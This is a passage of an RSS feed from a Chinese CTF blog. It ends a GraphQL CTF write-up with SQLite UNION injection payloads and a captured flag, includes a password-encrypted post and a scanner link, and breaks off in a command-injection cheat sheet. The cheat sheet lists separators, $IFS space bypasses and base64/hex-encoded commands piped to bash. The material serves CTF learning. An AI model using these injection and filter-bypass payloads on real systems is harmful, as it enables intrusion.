sqlite_master)-- </span><br><span class="line">&#x2F;&#x2F;得到users和Secr3t_fl4g</span><br><span class="line">1&#39; union select (select flag from Secr3t_fl4g)-- </span><br><span class="line">&#x2F;&#x2F;得到flag：HITCTF&#123;fee26d3a146a404e106b1ed93156f30e&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20200416004911642.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1528799" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1528799</a></p><p><a href="https://segmentfault.com/a/1190000014131950" target="_blank" rel="noopener">https://segmentfault.com/a/1190000014131950</a></p><p><a href="https://blog.csdn.net/qq_41882147/article/details/82966783" target="_blank" rel="noopener">https://blog.csdn.net/qq_41882147/article/details/82966783</a></p><p><a href="https://www.anquanke.com/post/id/156930" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156930</a></p><p><a href="https://www.anquanke.com/post/id/147455" target="_blank" rel="noopener">https://www.anquanke.com/post/id/147455</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x-01-前言&quot;&gt;&lt;a href=&quot;#0x-01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x 01 前言&quot;&gt;&lt;/a&gt;0x 01 前言&lt;/h3&gt;&lt;p&gt;​    在之前的VolgaCTF 2020考到了GraphQL知识点，GraphQL在CT
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>出题笔记（一）</title>
    <link href="http://yoursite.com/2020/04/11/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>http://yoursite.com/2020/04/11/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2020-04-11T07:46:00.000Z</published>
    <updated>2020-04-12T08:53:43.243Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="0f5575875875b2be4fc9ff7ef7fba887d8681309c2a915bec81e81cdff6b09fd">a7af55643fb17828ae2be71d6364b2f13848a95c2afc620e38a7ecd9e604037e2702774c8c0de18f25c3cf576184772f62f2befb3baa6b2f3c7b804e4baee12ad44fe5e99b79ba74d36224e3dee75c1649de841a4018baebb3d03fcf86607faad4aa804b6835ab0f07b4e93e8c46664d12d3ed13dcd14d16f90ee314f456713c579616961453d6d403c2f45e9864af4ba87ce312e1bc9b627deedf7a5c599102f6800625c99a5abd0fcd41aa8ca8eaa021f6bc12e9bdb6a2581a9cce861486c6a8f29c10c97fc1f5324ede38553ea72357eae90bd2b9f56aba723d02bb1e18e278c1e618bb280b8022fb78aa23d594f2ceaa492dda8f548a1e77be9728fa928ca419a31055170848846debaf94a9d6aff17aa7cba43fc5ee92258810490f3cb4d7936d12e5079749e1acc30209b576b0d1193bdd9db06edc1550effef4d3be9ed52ad5e87dd9f5fa3e422450e264ab35e1690bfd6e4ef24c6a35605088fc53131f98a315751fd3f2db2e841ec377955f190382e541d54b269fddbbecb4cf322a1eff8e069bc3be1749786ba8ad1aaeca7a07454e41b89c9e35fc7b93d9810c20036bdd53054100b1f85ec353b98bd9100c08a0d3590f33232a85fb69238a13b8e107f92d132214046fe58944581c8d0fb3616afc7e47f980c8f1db4175d1dd6ea68cfe831a202a7eac480cf9f211d5c0fa18eb85260234bfddc2a76893d44a5cf63f11be813b17b972d66560563ee4ff78285dacabc78e7b64e91589d4d634fbe60a188f87234f1f9eb2067bb9ce9945ba040ce36dd9f9919e32a1d833ab0748282df7943b52b910d95318b1be1d12245aec710a853eadf8d7259bdd8ba5db85b1573295c8fd351fc7295f58e50656d01bd94fb7a43a9edf63ffc8344f6af13df8ac1d1607777399c15d8debd7ea0b4db116ffeb174d52c2afb5f1a30f0f668297e52c00758ed12f55c530682cc2ac31d8d6c84a8830f3e7655ebf75750c6e8d9472590aa1c547fce068e79f3f265fa610f04429f503ce7e737f41e31b0d3db70f415ec0de9b7229c6b010cece5baa9fcc04c847c434f609bf0f4edbd1b24658033ffd6d19c4ba91395ce0a2889f181629b2b70ebf719bc9f68d1e022f3b5c6f22b24820a1a1ad18762dbf7d1723837d9c365d42a1f86ebdc31b651dae434bab58978ae546e422dbad0bdc46afacebc8e94c3ed4559517531c43be67db857511e921543b51a1756b7aeae5e2d53baec01d1bab2271c88e5a68f70502c54f04ea67b429a2b299d98757c60842fff6e2ba025af08468820087c6da49d5d1cc99a09113aa02e87243ba2f9f65790a1daeebcbd633cc307cd1496346b3da15688c068442d9c3c913dc44eaaaf80df19ea2585060320a2c77d6a8d9d063524b7b206aa72b9f75547c2ee84ecebac3a16f6b3ce63fd4bee56d2cac22bd60f45edc09e2fd93abae5b00ab22dea04db791efddf03e34a93631b0d133352a2aa985337e6377ad0bf19cd486d7e74782dd618363089db92867db257401405976aaa2cf7b24a931176f76b2b050a57d6d3574f3d1ea450279a3088040fa062d3e9eb62d393078c47dea7459d8eb9b2906092f23406334a99d50b8586f4d31e217ca22251f0ff20a778cae5d70d59c140cade343149a73b05b20abe457ec39dae621583f21d760eacd525a53dc09506f434a933db26907bcc6c8a440d6512ee6de7aea8a0cfecc5147d73b00cbce25b6e88011977d5c94eea382bec663c5601377c7f63daffbe4027c2c779f88574d1fe1f6cabc8235098b85c2af0ba42ef06b9960583a78180637d4e3d4288843bd6e4f2f8f3b6369fd76780a285907d304363faaa2fa2d15ace3b65cfebe036e575e238032e02ee1bd7712281fb57c89274cd4701f5295cc732166a8414fa6caace76484a75f30f1dc995e0bb20b1de169e3bea7291fddc7a7449d7dee329bda33cab0e74a3e02da014fb1c5d5aafad55a8b908bdc323ddce15b9e67a2acde37d2a5b2375ccffff21092b3003bf71eac60e1ba7d2fcdd40397c3b14e0aa3b4175f4103d0da749e59103f9fac6365a1c0803b1bfbfd1a2db8ebbf2ad649d94960c6f4b4ca5699d07a3a958b60b264a7979f04d29be8ae1217ff640a685a42220d584ade4a01dea67b638e6bc8e9fdb9548301c1f93fc817a2191aeaba8f96e0aa494d7d082e114c1e3840a7691ed389bbcdb4a8c330e096e99335c3640d4da132337bd1a8911ba397f2a950df7decc919cd04c4e778594c8767f67bb9cd43dd03e429c680dfe51c5a316284a2de314c92c37773bb6565b7202740b62ded2573130dc5d70795d78cc8a4b1a88d0fd83dddaa903f9c2fdd7214126f8f2307e5ac92b6d588ef392744ab8cbaf73eeb274dcb24d518d649206e85060f877f0798869145073f0026f08adbbb3d12f2d4db833dcf63d80a58124507735dc5f82e16a61a23213d7129d5fb3d5bcfb3846e9c82a4b220320b5e3012a10d2409796e635f89130d9c3f24917dbb9ab03a573b7caaef64566805f6ed883fe7b0962f50499482fc78296536b80baaeb1d1bf83865dc3b39c079f5ff9dbebd6fbb805935c7d799457222ff6cb1332ffa66019655dcf181beaae16552cf0a15ddddaa9107d88702a1f68ac609f7ba46aa7bdcde460e0e2ed446d72fd936d9294dce4490fb637ea7a49d6be480d91d0e25712c34b8a5095f162d1502679ec4bbecb67026cfbf4423874870fd0cc975f2317987d66df8ed9f9193cbdbfb1045a124832e5719befb52053af7a41b271315adf0369b89f679a89b02491fd79a0f366e410e1ac2d9f3016cc02edddfa1caf69a2e0126efc1c524a3227b5be980248b96da876a1a930b1e76dde34761c30edad2dfec473458196da62aa5c2dbe68b66914a1e26eee417a8971208b59bf81d890390228e1665478e5e25d4135a2295da4c0cd7f6389da6e83542f4440213c265d61633c7c7546231ea04202484e1d50c918b7a81dd859e2c6af3d967a2e548da808d4c5380617c76feb1a2b3d2fb961ef81caf0a16cce1ed742b0b965a09b2c71a13c31b5fc1fab4c19ed172b3177ed3f8deb677d1eecc04e1f23ce96ab1937695fdcee51db498a352cf8b288e996b42bb419dc87351f36f03b032c721a2a95075820a4baca643a4433da2a17970b5bb1d170cabfba4a11e65eac6f544d024cb247e7bc68f05087b2b0243c1e6447834298fdeb89c6b719d128feaaf9daa63acbcb75f17decb252c954731b8a1b64105af94d54586007eb6d4f4947f668bfeaa8164a2003adbee6b81cff8e3ce23eb03ce67be3822504b2ce1d56db4993d4324bae5e75832abc064f4a7a56b6fe6ccf7ff78c6ad1666d6f2dcf693f56d7c206e956e7fa7f640a9e184c1ae576ab0a5a11ef5ed428ca5eab964e4f28870710a16c1b5208208a64f4733b66af71b65015313abd902e6168f641c06eb833040efeb2d96ef0eab171ed7205c27c5c986dd84afacb0f720044a7937c09365925a2aeaeeea3180d926396685a569a365b3d2eea55d3b018c925b8c8e4c6b08c0a6d56c545f2dad4fc1e625fdd1df28c7d3c1fc209474cd3fd9ce64137abc9f48bae81ac5cc0f8bf02a925e2ebbc028b22c74398f4e6f006d4ea58e839c8b4f901cb196a7659d33dc6cd652b165321564bcae4624f22d0cecd7fe9a10e4b2169047ff5dc88a1404d59a754c6c2c0b0736d9b729dbf9d2c4caca965addd0104877d02090153de7b11ac6444973bbfe38a1c9c0a0913a488d50e1f5b05c6cd848a9d4d688ff2047b155963b8575e04c171a437f4b0f5d8fa2afe610d3bff867378ab67146b55e4d466f6095517dac12ea65deb0fc0d27f4a00425b65f6e42c80f9b7b98c80807d57cb75bfb8be986d3d9745a2ef32eaf0164c0f8f9fe44270742eb4df3e3794a06da6c44143de221248afd7974f03510dc06d57520e841657af9b8bcd7555ebd5bb8d7e85f6f43e890b7b80f7f0df829563d9c294ef0ee4ed3e5eb0253ca7a9c98009dec50340dd469a478758af7c76beff763d21757745607248669720b3450b327f4881233666e4867b21c23d687147da13b3c7d6aa16fd810e933df8ebc10f15ff396f6aa9058ba96202f8809bdefb76b9610e47a4eded02ed1bb7edc120279ca1680f33ec8fd58db1cbebd69fb92ec8d51e1bc00fbf2e5cbf4523fbf8ace349c80b21c433dc8459cb49bfe9f9b643eac7c9875b90059e04160abc32ada8128f4fb9c4b77e331eeeb37fd9154e637f75481d9572db5761cfea8c3a55f6c5980ab7f032abebc210dd75b066ff188900ac837666b78bbebcbd7208a8b2f0f4b453e91b2d5e203a713eb6b0b169c1b51ff24f400decc02cc4248aab3f3a23e5f4e3cde01faab0c5d5fdabfb1e535d7f6c04dab064c01009c1c99b0561c6d06b4986100a342195b1cab36e1142f34b134dbbff89d804d733d9375ca692cf89b252fd1c84dc73713a8d595ecf34ac3a6ce7fc50924f8cdb5fe8315fa4ac2c1e9301e19a207461788c982f4b3bfba508e3af28fa66057a55c24aa287cd7b6d54322d3e380247f05886c87c1133153aa6ad2943e65940e16f35c38375533780a816a64b01cf8c97a50203dedfea5355e570c50e317a2136410cff922d7cfc21becb13cb7861498661ffa6201785d555200b32c8d56acef28c4b0a7c86a40c9bbbbc784bde7b60cb3e74af1a2ca0744f4acc9b1e69c987b59bbeed847a8af736b16644abf76b60e6d84fa0469df4eb20467ac1253ba1b32a3c7b1900ebe139808dd6edf0a82e73fd6252e6452740e6d2b5a94996325452042fb73bd277ae3e4219fb59faf720122c71cb5dfd9d41901e228c1b87921e9e25f328999aa71705a25a14f00444e4ad3f1226eca979e48eabd20cbb22d9f8bc22c2363e17219b8ee3b6bfb35b920bf42a18ce2960ffb332f62ac74aa43d19d1e4234d372d8c94ec988dffef9bbe08f278728bbfd58f402e2ba553922c028f2d35abfbd84d2fff53b8a18538669d4a87f1ed69525d5c9e3948f8ed5b0d88338f5aad495900349f759638b9bf62dd3ff7b3ab75b7f575d1258a2238b676a778773e582695e531daedebe754f5e33d7f0b0d36e9c154a5e286843527624c94abfe788864aae3f2dabf78a7835695dcd0aabceab38f1c8881d637812297d785f3f4a482aaf12174c2ab1596b7135aa8884b74cdaa3e4eb4a2ebe3e9a87750d88c9cd1971032dbdc9ffc2a481ded118063400b52790cfc4b9b1216ca6f24bb4edc30bec685af9e7713ad570d1022126a43e1e5bea3d714961fbb83a6848b03916ee1d3337a8cb943e2d0ca34ce4c4d81862c5f07734e7492834e02d8f231cdd9a15d99a262096bd1f658970cb1ee3e66c0a04fb32d39b718cda1cf9fafa03ee86f367bb37c2d3a11072d3916ce224fbc5d831a49bf9962f50116f639345b2aa4a748c88efb49f05d0e31516d6c020112372f18b70331086b1f1ca448d9264b317a81edb4e1b23b6cf0a57689a5598bfc407b75a547da5ec7d1367cd4be12d799f5c601d9177d4882b0a655abc8598accfdaebbd6032a6bea19c07d15ce7637428ce93f4ae686cdf26ef75ff716218802a6e7633e558c1e53cba6024efd55034676fb596cb4f814542b3517b60846bdc38a124712a37e9de22db40d7414d649acb354e7c52258a8489fcf1f3d380ad10bf79d2c0b9a2927fb86405f66145aec730d34c3d0b79a5465d719f16993582a7b410788e807355e4283ee4bde68ca8568de6d58e0391d27f50359282559ee43edcf66fb9d651728025fbf1a17567324badd0ab9afa4377e399ae57778b5cd6a456f7448a83105d2c13b4deae50342d2db281d590344bffdaa45bc58d01c64c79b79d7c0a60df9600a7b9bced879f7bda64ec693f08e65129c23b26908f97ba126cbfafce1f63373f13fd05c7dfdf7c71148160ea24b9b17fe33721a22487b21c6ebe6fac90fcc8d8f50fa5232fbf3a5c6378a9bc4d6bca1baf346130319e2cc5cb04ff30219b7780253812ddbf7bffc3f6d3a2f4a4fcb91d170d065afe7c583356ba9d7e2bdd2b5a7f79937150cdcfea1b450fe47054da8255d4ce175687d383a00ed47370e50b0013ecc6da4cbb3d8667a921a3451bd35e6563b25b107b7d7fe46830fc19afd283464000c1fdadffbaedf5023296bfe3ddf12f6ce47b83554920af1579d3b6bc7a14bcbd17be9d69d1d154c51d61e2de0f8e573030a61864d7d17dc05db73621271498774071c7a7d0a3cf394861a3f7c306e266e42cdbc6119b1f8242245658c3153dd21ae5b343e10609ea7d5d7f75e8afe4e29054cf51695f3892e3330091d1ac21d7aa92211c887fb53d28e9ec392378cfa136dabde343e4f536bf90b09d48ac74fef18f087ba42ce09935c24e79f1ef0bc57cd7f6902856875271c78a04a086ed8583d9e57a1fedc1df25f9224bc97739ea996420054958311f45ec9a5cafec1845efccaaf6b3d63a13fd01ec77cc2edff1ba4e8d1fb951b5ad1f341ae9949643f2ef04ec92a3883d5d6b166948e9da7490080b091cf08d02b7718095b52828eeb1e1da7c206731fdb48c50401adcf457e8f89e995330f2dfbb2e942cb438bfd46f0a80f407a9ce1024b95c13b74df0eb46461c022535ea87fc1d72c01d0aec9733a2de77679304d6022cd88a68caaba2f2b5cacbe7772d5cd80cf15181cebbc8ac4d9527d6e95c97b5aeb53d83e11a0569332d52ac699c63d95c701e8d92cec9db0b3c8e24f45beb57b3de4fe41c4afa0900573ce84d2e26173a00d1bef70483350f1e706e532a25cc44a77f8bc49709619a72cb6edc5f92920850362b04d08ff3a0f8b1f905a88be599de7c9dc43f56f2ebc468d84d5b6a904ef101d4f60c2a68816ace349c35ebcce24fbb50c88885fdaa2f8e5150352604bc35cd7af17864bb88922d54c2c1f7e90f493caf18667e5b662d3d3cbe554a27107853a869738c141cc19b9c13c7e943f9a2a49527d7052780aa9e4659f01054ba5e3f4af308e1fdc1a63d7bb14054dbd399236949205b9d80d2d57111ba59d6f9df678370f74c3a1ef29a912c6d3a90aaa0158572ed8a032f7c614fbbbdc33813707c0ef29ce8c916e09bade821db3586877b5e9bfa0d171aa5f0c424234036d2577df7c587b567eab2eec3ada4f45c6552d1cfd83f6da5aa1c20c3c14469eb4c9e75dbf0f8768a77062a5647c57a57a3839d4572413b72c92e1bc5aa682d2e4dbc10c64fb2c4bbd910132f11626034fcb1ed456e6e70cd10253d44bc5e6d3abe0bbb73b082ef86dfa05d9678bb01daa12d984bbc92133f70b6c7f4cab52ecb84490f75959f2559f0672089af061fa16b747da10ccb35ca7a0ae509107872225acb472ce46430f3cc59d952beb1f993d4e3b144f699c136dd270e1664874d50778b57ec73e52e51980c568296101bcd54c290f73ab75eb242f07e22b80baa666f5f6ef3d81f6bcbc49953a5babf3733e3116d1a679ad42d3bb846097f6dbf2c29ea2249fff595d805f5ed0ca8234ddad5ff41411f29efe65d99dfd8e589289646de347dfa42e4f5cccff184b4d3a9059b98450acceee3ac89f84131b85093ef93cfed7d1783e389d76d0c3f82dac3dcb09065fc11cb550cefff3ebf3c6938878bc80bed7678009906f6312545fbd288ac0f405ae23c273b8280166fe9742750cd39983f1874261fad0b0fd16e38536709841ff8a50ee0a9c2a80a72d6f2967685ece2fd74220d769fd97bed41cec51a1a6af3607636ccb3a7e8b6b5c2f87e79c274faf069ff538742a3aba5acda22ff80b746edb4d11794ffa505f0016f1033ba4a750cb323ef2642026e251fc58271035acf15b22be4b914f04d1e9b20eed4819cf5ccca38711ae0824c9fa5291085bb59944b7f3fc834c8e65bf7bf3bb21834bbf0b31672ad272509cd887a270243fcf01fd8d9a33e6da1b458077bea5f4131d8a2f24e9db60f4a817c9531c4df641ce3c4bbddd80b4f22637267dcddba50aff01d9b016b874148af0e0e3757111e94ef66ec27ac66bda0352dc21697c354c1437ebf46c27e1d7c2b825bc5ded22bec999677747a738bb32066fbabd40bd9cecbe919585f95773ac1abb6a0cc8127509678c5c9749a9b8e43993f935f4c07197de8f65f9b5c3b840d2b1a6ae35b126a7426eae6bf6b9224e248c991d52d10cada7fe07cedb8faa0401dec55080ecc4e0f5198119f5792399651a2acfe700f6c97533f2ed11d82168a42f89d023215dca0831348266db4fe87f38deb972b98156bf2fc24d9db01503a92a7073c55753735f8ffdc8ebbeab4d3a67420f97f3e221758e13978f81011d77ed742841fd77e719171e389fa2d53566acf368981881c6fced950a18902c66294ea211288ab631cc910f6ced2873e0793adb262e5702c341a945ffecb9861228d86a53a2123f26b64b2dda5470ff4eba93cb7b406dd99fdc8e2194ffcbfcefa96150266cc17d98c107ff964f7b511b633035cee69b38594624d639f395ee0fa8e41960a16c175f303db7ef71b995349f401459cb2a759a2a2d93552b228fbbf285a6f2f659f16da2a19097ece7f5c3ac30e3fda2a3974c9a4bbb1d9fde5794528d834c57d33acaa389abbb2bd0e063a519d2cf3bc2e9663230da8b6bc7d5312f47264c238ce92e3d8129c6357cb3bc741d2cd33038a01fd5fd905dd333c242ddb12a9782f1fd102cebbc04b889b5efb2998e6dd51508ef71e7d59956e67d3b62843b3b8a4920faf3b0d9db9cd7b73821d515d4f95078c5dc6c43b972ea03e305d5b87d43c9da037cfcc9bc03c23e1d5cb13dd2d7600d164b32ad029738342c9295d2ef9c42ee619d96ebc60d7e919ee67f880b3ddbe52b4a6085fbc00cb84370304579d322e18082179af645439b77f035134c84fd0357319aefa7ce76ada83995728336f06963f7799cb900e66b9dea3b9f44b5f857cfb5ae84c63f7ebf54d1e3f535fe8d87b3095e458b07334ddf1517d3e492a36ca06837fb66e9f51b295bd98ada01c437ea31f1d8e3d805f643b806ff305db355ad3314ea4ef5c15ed581686a65dfbc3b89ad92cf746a6f21c6e8d13f177a21d6ab57b7e68eac5c2cff0d65bc9db1013b9cc6d63d806112a96984043368f845509da43deebe6f402f574fd94106c9883dd9b51ef7456c1a10c2d233ae851b0debab1a0189a35fa3e6fa78a4252e634e8a61a6c18f28df713fa88ac72eb8d8a579723f2280a6082cbe2b343e2b46b968ad5beccd9a3a6dcaff6eac8fd5c7bf0b6bd4ba45749a262b79d068bb461f2fd7748f6e45914cec98e3af6843e9e8b0125e89ced2a65abf5392fd6e0eb3c9ff1fe9b97beaab4704a2e8fa4f4bd58df153b9fd39432fc04d26e6922adb57ced660a0c7f5aeab5f6dddfce814dabeab51142a89057897c77b0dd95f08399d68afa66ae8e55a8f30332e7ccc652cacbd9c4870f1b87ccf275af969b338693e7c07a7f7a98e033671d418f2cfe65275f1cc9865babc04f217f1e194bd0ae3ff45248d44bd544874357542d772e5fa26abac26dca81f56e2412a75255e526726cfe4f6c4e9139e71e7400da5b8a2af3686627b47671a0a0e6d7021b8f96f12dab320b27a505609f43780ff9f4d1809aeb8b44d1549b5c1292fdb69d92a6a805d9e7acc9b0c664bff273d908270b3c3e26643a676585c6fa7278595a1c556b16ececb69f0bb51fb7dd044f6bf83b9a9688da3f89825ef6eaee598694684c758f3c43b9c490736d03a2dc6510c5521194b4fae4e98f1c46731d9d06256e149d3290dcca8bed3e041514a5bbebee08c2a47d096fbbab93f5d809227f549a8714df85296852f36dbd2a29834fb456d73055f8160cc5ad8c9d57936f7c6a602dde444b01ba79c0935dbc1ca1686ac333f70ae8bf81009942392020af9714a30db92b7ad4775e6e1deecf16ae9e445ff01971411af64e52a994647656807995e8c6dac9f42cb98fb984b0704d909414316983bfff18feaf1ad3a38728114691687344d060bfe18d54a82675a2d4483c4e0f62e3b4793025ccc063ab091dc7e9d185840a4782a4bfe317b98eee49a3d799feabaa41c72c478ae38087883fb9462d9114547c568b3c0650412f7e8b2c0b8dbd887265fec46dc41ba19b23d83714c36c1c7c2a922ce14033ad41b58ed59b447a4f4d4dfec6b5ad05a31ec09a55d090eb9a01948aadb5db1cdcfaf4bb48e25b5e618be985c082cb36f0f5e42678f0152669b03cf655ceb40c5597d89f7c5c1194449af1ab791bc8a847b5f10781f39a98a9a06fd377088db0e2d0e15d93fc94aa7981c93df33b5d1498cf9efe5662f1f9d757893309c91e66b4bdc95e91b76ee3c27829fba7c7063012c7678518504f0d93c27c8384a2c1e3e02dadd4f5016fca40d6d79b9e57e9b6fffc5a911cf94fe348712904b1bcdfa31e85ee50147f6a8c7692d9060a44d82b7e1347c154ec5368440d8994103fd57259d76ee22ca92e2f4d46e4d5b8859f45c5e46e0736f27e7b10ea51a9f29838a04a43f93693fcf41800c070fb75484adc7ab05ef2a4e18f88751709b633cc77ebf3bae4179040431709a34a00df6694f821d2a88afe7bb090501214321f2b305d26feb62be6efd3443fc61ff5d72847af58fe9eaa3fb3d97453e1196aefdafd204762f463d9ca83e4e2ef3119d9ddef1d02dd9c7085d5bc9a6371501caa055c3e420c6f5a28b9e23d384d8a32160cf6ec34f7a97239fa76b189c54e6fee8617e37f45207435227a918793fad7ca1afe9b44302caf9241a6a4e806f386c10b459496fdb3246a31ab5f61b1173a19fad853e90d10e5228174eef46dce48153dc67dd59ac3980ce8d4e53473ce973401439d0f9570b46ecd66a845d79dc493c8e389e394990ca340cf7e89857c9cfdf01dd6a77933a5982621a64c173dfe4d993d4cadf179c840188f055598787599246a711c3c2c50314ae1278c13af04b15063ec74cce40175689bf80dadb3c8336111bd2e63cb54d53e1bd90d8c6ced2c21c9ce091bf88e0096545a1d1f331c989e1253caa81e353e4738b6e513aaca851872e0c0df5ef79466ba3734f38170fde899b00e108ec3f9c80e80b08845f90ae3b272e4eb831af97b2241b21c6773cd40498ea654f55178c9ec6382195a00abc9bd25991e39002fbf8382e2ebed07c6ab08f3857d83c25d4ac8ec6e1313adc44ed3b17b7b299f7c142ff95d6d52e937f99121edf286289a993da44ead296175b98f34cd129499de455663b125b08399daaad1ad94519cb62c4374393f1df109bf1b9f60d4ff7861a6c2a806cb62acf34a25af5b72a279991c4894c899a59b1c5aeed5fad3ba3f7d01bef5a39af18d9a7005a536046cca2a65f6233dee168915e29724d6b33a3131b8d110858aa5ac9eda4b4d1fcc642b72cdb3968075bf64866ad62e224283e50e9d57207c8c1ec76bab0b66f5702b757f1b4feadf2b962066b71dc3cbf602d9996f3100439561c119743f6acb97193c5b32e428b7cb59892df80bf3941cdb22cb948ba5bb09e0aa551475d96c79b9c1f8664d311b91f0456bc785b4708f00c585058b201a9782e03d5c39aa8749b7a34fd1bcc7d83baf11b8fe4c6844e5138aaeb7a17913f7fde3c23a94265d45a46fc1b552bb890b4c3377a3c1a30883ca69f29e7128905226839ec55ad3237bb85af87bc26965deb17ed09c27890ff74dc27c620d507f9939a15f9c0550564092f7f0979327fc1906a378733ed3ad84bee93e04202856bb0e0c4bf7c3095910c1a252d36810cc65c745cedd3a6fc695f62ac405ceea766210b1c950d7b9d669fa0280bfde3a939d16ef08e7f4b4b38dc8fcfb713df278c3403478fedf5a2f81bfe92034d7e0dc5fd7ed4ab3a4f54fb5e679e6e11564f6be50fad00a83084925bf2464fb2254026948e6c8b022097fcb8002843b800f263a59e6dbde50adc02585c4641744bd4ec995cbce609e5eade9ca1565e087abd5203b25b3876a5c6c04ba7d2b23ca5700a201fd5f0bd341452abdeae64d97920f51343234469a877b90351c5c9978b68c43b3f0b5956bd1156c46eaaa670c3c9cb75162283cf1837721423c59fa5cfca44bd89bee8eb90b4356176d249dc5d21c314d680a5460d2c04c50c02a0ca0c5f182e8f715cceb9a22dbf9ad8fcf2a9cbf1bb0a8247523937ea5c9b71b582b2913a028b93e57cdf954787e7726e5f988a884deadd6e2ccb153580c9d0cb730278a9029adf0b55774cea07df931d1efce081e53f677bd833f203749d7321f9b77fba2f9794656f908f1f34a911fc3d9042f8c8777cbc4b1b7e09048c323f767c41cbf5b82cc91969f3d25cfc2124f78a68bb8cc2eca6db36910cdff523cbc57fd960950313ec4da73da4c89e66c198e633439356b17cbd4f3d5fdc88f74e0a7d41f83fa4c56a508dbababc5810f794350925d645bfe40472da0e920fe71523f2607deae8977e56c764c7285d1f7f725acb2094f6c6871985761f595aff0390c2060d7461a79fa085bef6083f927aa26507bae569ade3ee34fb5361e4d6fbda24b2f1ed3b413d6c6575b476bc9403a8d8b15d98298c1efbe1553f10022224c38b61aa95a07f37dbbe26cc3e95fd1e064402b2af9321058728a98c7a790422d7a6096c122f0fe7df21aa559a1814dde84329b3d1c1f511b15e47e5fe63a3a476f805f110730fba4f7ff16eb1eb140269ad7393ae002d1a00be71dae2e54315faed2bff79d8e9db4c69e91060ebff416ae9317e370a8786ef24a66ae39593371a5bcde8d11253503401aa4e4e653c415276e99b134aeffdbb6ba66acf71ceecebf21c04ac09a661e4177d44f6cf6082da45f82247cb7252f4bf9230f70287ccce43440dee1cc4759335081dc4ec0cd43c46d41e22ab5318eb671cbdb3ec3dcd74491c3b7eacabe7f341e2d1348e99d3f94f7f102d68ca136bd28397f308797efe22d09c058a3dfdbe49263139d34f980</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="出题笔记" scheme="http://yoursite.com/categories/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="出题" scheme="http://yoursite.com/tags/%E5%87%BA%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>常见的漏洞扫描工具使用总结</title>
    <link href="http://yoursite.com/2020/04/07/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2020/04/07/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</id>
    <published>2020-04-07T15:55:42.000Z</published>
    <updated>2020-04-07T15:56:22.515Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/chaitin/xray" target="_blank" rel="noopener">https://github.com/chaitin/xray</a></p><p>nesuc</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/chaitin/xray&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/chaitin/xray&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;nesuc&lt;/p&gt;

      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>命令执行tricks</title>
    <link href="http://yoursite.com/2020/04/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/"/>
    <id>http://yoursite.com/2020/04/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Ctricks/</id>
    <published>2020-04-07T08:42:11.000Z</published>
    <updated>2020-04-07T13:15:27.126Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-命令联合执行"><a href="#0x-01-命令联合执行" class="headerlink" title="0x 01 命令联合执行"></a>0x 01 命令联合执行</h3><p>常用的命令分隔符：</p><ul><li>; </li><li>&amp;&amp; </li><li>|| </li><li>%0a </li><li>%0d </li><li>| (管道符)  </li></ul><h3 id="0x-02-bypass技巧"><a href="#0x-02-bypass技巧" class="headerlink" title="0x 02 bypass技巧"></a>0x 02 bypass技巧</h3><p><strong>空格过滤</strong></p><ul><li>$IFS</li><li>${IFS}</li><li>$IFS$9</li><li>&lt;</li><li>&lt;&gt;</li><li>{cat,flag.php} //用逗号实现了空格功能，需要用<code>{}</code>括起来</li><li>%20</li><li>%09 </li></ul><p><strong>关键字黑名单绕过</strong></p><ul><li><p>ca\t flag\g.php    反斜线绕过</p></li><li><p>cat fl”ag.php     两个单引号绕过</p></li><li><p>echo “Y2F0IGZsYWcucGhw” | base64 -d | bash    base64编码绕过(引号可以去掉)</p></li><li><p>echo “63617420666C61672E706870” | xxd -r -p | bash    hex编码绕过(引号可以去掉)</p></li><li><p>cat fl[a]g.php    用<code>[]</code>匹配</p></li><li><p>cat fla*    用<code>*</code>匹配任意</p></li><li><p>内联执行</p><p>所谓内联执行，就是将反引号内命令的输出作为另一个命令的输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 